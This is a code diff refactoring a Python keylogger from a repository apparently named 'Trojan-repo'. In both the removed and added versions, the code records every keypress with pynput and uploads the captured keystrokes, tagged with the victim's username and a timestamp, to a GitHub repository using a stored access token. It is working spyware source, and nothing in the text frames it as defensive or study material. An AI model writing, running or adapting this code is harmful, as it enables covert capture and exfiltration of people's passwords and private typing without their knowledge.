@@ -1,30 +1,22 @@
-from pynput import keyboard
 from datetime import datetime
 import time
-import socket
-import platform
-import psutil
-import os
-import json
-import requests
-import base64
-import threading
-from dotenv import load_dotenv
+from pynput import keyboard
+from test_main import SecurityTool
 
-class Keylogger:
+
+class Keylogger(SecurityTool):
     def __init__(self):
-        self.log = []  # Store the logged keys in a list
-        self.output = ""  # Store all logged keys as a single string
+        super().__init__()
+        self.log = []
+        self.output = ""
         self.listener = keyboard.Listener(on_press=self.on_press)
 
     def on_press(self, key):
         try:
-            # Register character keys (e.g., letters, numbers)
             if hasattr(key, 'char') and key.char is not None:
                 self.log.append(key.char)
                 self.output += key.char
             else:
-                # Register special keys (e.g., Enter, Shift)
                 special_key = f"[{key}]"
                 self.log.append(special_key)
                 self.output += special_key
@@ -32,81 +24,23 @@ class Keylogger:
             self.log_error(f"Error processing key press: {e}")
 
     def start(self):
-        # Start listening for key presses
         self.listener.start()
 
     def stop(self):
-        # Stop the listener when finished
         self.listener.stop()
 
     @staticmethod
     def log_error(message):
-        """Logs errors to a dedicated error file."""
         with open("error_log.txt", "a") as error_file:
             error_file.write(f"{datetime.now()}: {message}\n")
 
+    def save_and_upload(self):
+        file_path = f"data/keylogger_{self.username}_{self.current_time}.txt"
+        self.push_to_github(file_path, self.output, "Updated keylogger data")
+
+
 keylogger = Keylogger()
-
-# Example of the Keylogger module
-print("Starting keylogger (run for 10 seconds)...")
 keylogger.start()
-
-print("Keylogger is running... Press keys to test it.")
-
-# Run the keylogger for 10 seconds for testing purposes
-time.sleep(10)
-
-# Stop the keylogger and end the program
+time.sleep(10)  # Run for 10 seconds
 keylogger.stop()
-
-print("Keylogger has stopped.")
-
-# Output the captured log
-print(f"Captured keystrokes: {keylogger.output}")
-
-# Generate dynamic file path
-username = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
-current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-file_path = f"data/keylogger_{username}_{current_time}.txt"
-
-# GitHub repository details
-repository_owner = "BlertaJashanica"
-repository_name = "Trojan-repo"
-file_content = json.dumps(keylogger.output, indent=4)  # Convert captured keys to JSON string for GitHub
-
-load_dotenv()  # Load environment variables from .env file
-github_token = os.getenv("GITHUB_TOKEN")
-
-commit_message = 'Updated keylogger data'
-
-# GitHub API URL
-api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
-headers = {
-    "Authorization": f"Token {github_token}",
-    "Accept": "application/vnd.github.v3+json"
-}
-
-# Encode the file content to Base64
-file_content_encoded = base64.b64encode(file_content.encode()).decode()
-
-# Check if the file already exists
-response = requests.get(api_url, headers=headers)
-if response.status_code == 200:
-    current_file = response.json()
-    sha = current_file["sha"]  # Get the current file's SHA for updates
-else:
-    sha = None  # File doesn't exist; it will be created
-
-# Prepare the payload for the PUT request
-payload = {
-    "message": commit_message,
-    "content": file_content_encoded,
-    "sha": sha
-}
-
-# Push the file to GitHub
-response = requests.put(api_url, json=payload, headers=headers)
-if response.status_code in [200, 201]:
-    print("File pushed successfully!")
-else:
-    print("An error occurred while pushing the file:", response.json())
+keylogger.save_and_upload()
